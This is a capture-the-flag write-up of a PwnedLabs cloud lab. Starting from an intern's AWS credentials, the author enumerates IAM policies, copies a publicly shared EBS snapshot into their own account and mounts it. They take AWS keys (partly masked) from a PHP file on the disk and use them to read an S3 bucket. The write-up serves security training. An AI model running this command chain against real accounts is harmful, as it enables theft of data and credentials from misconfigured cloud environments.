---
title: Lab Writeup - Loot Public EBS Snapshots
layout: post
date: 2025-06-24
categories: [Writeups, PwnedLabs]
tags: [Cloud, CTF, AWS]
author: bailee
toc: true
description: Given AWS creds of an intern, see how far you elevate access.
---
Lab Platform: 
: [PwnedLabs](https://pwnedlabs.io/labs/loot-public-ebs-snapshots)

---

### Tools Used

- AWS CLI

### Commands

- `aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1`
- `aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0c0679098c7a4e636 --region us-east-1`

### References

- <https://repost.aws/knowledge-center/ebs-snapshots-list>

---

## Lab Walkthrough

### Enumeration & Initial Access
**EBS (Elastic Block Store)** is a storage service that acts like a virtual hard drive to attach to EC2 instances. Even when the EC2 instance stops or is terminated, the EBS volume keeps the data available.

When you create an AMI (Amazon Machine Image) from an EC2 instance that uses an EBS volume, AWS will take a snapshot of that volume, which can act as a backup of the EC2’s virtual hard drive.

However, EBS snapshots can mistakenly be set to public, and allowing public access to all of your files is generally not a good thing. Imagine what sort of information and credentials you could get from that, if the owner isn’t careful!

With the given credentials, I’m connecting to the AWS account `104506445608`. With the account `intern`.

```
$ aws sts get-caller-identity --profile LootPublicSnapshots
{
    "UserId": "AIDARQVIRZ4UJNTLTYGWU",
    "Account": "104506445608",
    "Arn": "arn:aws:iam::104506445608:user/intern"
}
```

First place to check is to see if we have any permissions.

```
$ aws iam list-attached-user-policies --user-name intern
{
    "AttachedPolicies": [
        {
            "PolicyName": "PublicSnapper",
            "PolicyArn": "arn:aws:iam::104506445608:policy/PublicSnapper"
        }
    ]
}
```

> Note, since I’m using aws configure profiles, you can easily make a profile default by changing the AWS_PROFILE environment variable to the name of the profile you’re using.
export AWS_PROFILE="LootPublicSnapshots"
> 

Looks like we have access to the policy “PublicSnapper”. Let’s see what that’s all about.
Note - the policy was version 9, so I’m using `aws iam get-policy-version` to get more details on that specific policy.
$ aws iam get-policy-version –policy-arn arn:aws:iam::104506445608:policy/PublicSnapper –version-id v9

```
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "Intern1",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshotAttribute",
                    "Resource": "arn:aws:ec2:us-east-1::snapshot/snap-0c0679098c7a4e636"
                },
                {
                    "Sid": "Intern2",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshots",
                    "Resource": "*"
                },
                {
                    "Sid": "Intern3",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": [
                        "arn:aws:iam::104506445608:user/intern",
                        "arn:aws:iam::104506445608:policy/PublicSnapper"
                    ]
                },
                {
                    "Sid": "Intern4",
                    "Effect": "Allow",
                    "Action": [
                        "ebs:ListSnapshotBlocks",
                        "ebs:GetSnapshotBlock"
                    ],
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v9",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-15T23:47:11+00:00"
    }
}
```

Wow, this permission lets us do a lot!
- “ec2:DescribeSnapshotAttribute” on “arn:aws:ec2:us-east-1::snapshot/snap-0c0679098c7a4e636”
- “ec2:DescribeSnapshots” on *any* resource (wildcard).
- “iam:GetPolicyVersion”, “iam:GetPolicy”, and “iam:ListAttachedUserPolicies” on resources “arn:aws:iam::104506445608:user/intern” and “arn:aws:iam::104506445608:policy/PublicSnapper”
- “ebs:ListSnapshotBlocks” and “ebs:GetSnapshotBlock” on any resource (wildcard).

So let’s use that permission to see all of the snapshots in the entire environment. I’m passing the account ID and the region ‘us-east-1’.

```
$ aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "PublicSnapper"
                }
            ],
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2023-06-12T15:22:57.924000+00:00",
            "FullSnapshotSizeInBytes": 8589934592,
            "SnapshotId": "snap-0c0679098c7a4e636",
            "VolumeId": "vol-0ac1d3295a12e424b",
            "State": "completed",
            "StartTime": "2023-06-12T15:20:20.580000+00:00",
            "Progress": "100%",
            "OwnerId": "104506445608",
            "Description": "Created by CreateImage(i-06d9095368adfe177) for ami-07c95fb3e41cb227c",
            "VolumeSize": 8,
            "Encrypted": false
        },
        {
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2023-08-24T19:34:22.909000+00:00",
            "FullSnapshotSizeInBytes": 9245294592,
            "SnapshotId": "snap-035930ba8382ddb15",
            "VolumeId": "vol-09149587639d7b804",
            "State": "completed",
            "StartTime": "2023-08-24T19:30:49.742000+00:00",
            "Progress": "100%",
            "OwnerId": "104506445608",
            "Description": "Created by CreateImage(i-0199bf97fb9d996f1) for ami-0e411723434b23d13",
            "VolumeSize": 24,
            "Encrypted": false
        }
    ]
}
```

There is one snapshot named “PublicSnapper” that was created. It is an EBS snapshot, meaning it’s a point-in-time copy of an EBS volume. So who all can create a volume of that snapshot? AKA, is that snapshot publicly accessible?

Using the AWS EC2 [describe-snapshot-attribute](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshot-attribute.html) command, we can answer those questions.
Note: The attribute CreateVolumePermission is an attribute of an EBS snapshot.

```
$ aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0c0679098c7a4e636 --region us-east-1
{
    "SnapshotId": "snap-0c0679098c7a4e636",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

So it’s group: all. Everyone (anyone in any AWS account) has this permission. That means we can create a volume from the snapshot. So let’s do that!!

In my own AWS account, I’m going to search for the public snapshot `(snap-0c0679098c7a4e636)`

![image.png](/assets/img/lootPublicEBS/image.png)

Found it! I’m now creating a volume from that snapshot using the Actions > Create Volume from Snapshot option.

Next, I’m creating an EC2 instance in my account, and attaching the volume.

### Exfiltration

Okay, so I spent about an hour trying to figure out SSH and key pairs, but I’m in 😎. The volume copied from the public snapshot has been attached to my EC2 instance, but it hasn’t been mounted yet. So I’ll go ahead and do that. I named my mount directory ‘disk’.

```
[ec2-user@ip-172-31-33-36 ~]$ mkdir disk
[ec2-user@ip-172-31-33-36 ~]$ sudo mount -t ext4 /dev/xvdf1 disk
[ec2-user@ip-172-31-33-36 ~]$ ls -al
total 16
drwx------.  4 ec2-user ec2-user   86 Jun  6 00:53 .
drwxr-xr-x.  3 root     root       22 Jun  6 00:52 ..
-rw-r--r--.  1 ec2-user ec2-user   18 Jan 28  2023 .bash_logout
-rw-r--r--.  1 ec2-user ec2-user  141 Jan 28  2023 .bash_profile
-rw-r--r--.  1 ec2-user ec2-user  492 Jan 28  2023 .bashrc
drwx------.  2 ec2-user ec2-user   29 Jun  6 00:52 .ssh
drwxr-xr-x. 19 root     root     4096 Jun 12  2023 disk
```

Now I’ll change directories into disk and see what’s in there.
Note: I had to use sudo -s to change to root, since I couldn’t cd into the ‘intern’ folder.

```
[ec2-user@ip-172-31-33-36 ~]$ cd disk
[ec2-user@ip-172-31-33-36 disk]$ ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv  tmp  var
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  sys  usr
[ec2-user@ip-172-31-33-36 disk]$ cd home
[ec2-user@ip-172-31-33-36 home]$ ls
intern  ubuntu
[ec2-user@ip-172-31-33-36 home]$ cd intern
-bash: cd: intern: Permission denied
[ec2-user@ip-172-31-33-36 home]$ sudo -s
[root@ip-172-31-33-36 home]# cd intern
[root@ip-172-31-33-36 intern]# ls
practice_files
[root@ip-172-31-33-36 intern]# cd practice_files
[root@ip-172-31-33-36 practice_files]# ls
s3_download_file.php
```

What’s in `s3_download_file.php`?

```
cat s3_download_file.php
<?php
  $BUCKET_NAME = 'ecorp-client-data';
  $IAM_KEY = 'AKIAR********UDSDT72VT';
  $IAM_SECRET = 'weAlWiW**********xxo6DByf8K3+CN';
  require '/opt/vendor/autoload.php';
  use Aws\S3\S3Client;
  use Aws\S3\Exception\S3Exception;

  $keyPath = 'test.csv'; // file name(can also include the folder name and the file name. eg."member1/IoT-Arduino-Monitor-circuit.png")

//S3 connection
  try {
    $s3 = S3Client::factory(
      array(
        'credentials' => array(
          'key' => $IAM_KEY,
          'secret' => $IAM_SECRET
        ),
        'version' => 'latest',
        'region'  => 'us-east-1'
      )
    );
    //to get the file information from S3
    $result = $s3->getObject(array(
      'Bucket' => $BUCKET_NAME,
      'Key'    => $keyPath
    ));
    header("Content-Type: {$result['ContentType']}");
    header('Content-Disposition: filename="' . basename($keyPath) . '"'); // used to download the file.
    echo $result['Body'];
  } catch (Exception $e) {
    die("Error: " . $e->getMessage());
  }
?>

```

Aha, some new credentials to try for an S3 bucket called `ecorp-client-data`! I love this game.

### Privilige Escalation

Signing into the new account…

```
[root@ip-172-31-33-36 practice_files]# aws configure --profile "ecorpClientData"
AWS Access Key ID [None]: AKIA****DT72VT
AWS Secret Access Key [None]: weAlW**********o6DByf8K3+CN
Default region name [None]:
Default output format [None]:
[root@ip-172-31-33-36 practice_files]# aws sts get-caller-identity --profile "ecorpClientData"
{
    "UserId": "AIDARQVIRZ4UKO53XSHRH",
    "Account": "104506445608",
    "Arn": "arn:aws:iam::104506445608:user/dev-test"
}
[root@ip-172-31-33-36 practice_files]# aws s3 ls ecorp-client-data --profile "ecorpClientData"
2023-06-12 20:32:59       3473 ecorp_dr_logistics.csv
2023-06-12 20:33:00         32 flag.txt
2023-06-12 15:04:25          7 test.csv
[root@ip-172-31-33-36 practice_files]# aws s3 cp s3://ecorp-client-data/flag.txt - --profile "ecorpClientData"
```
Not showing the flag text, but there it is!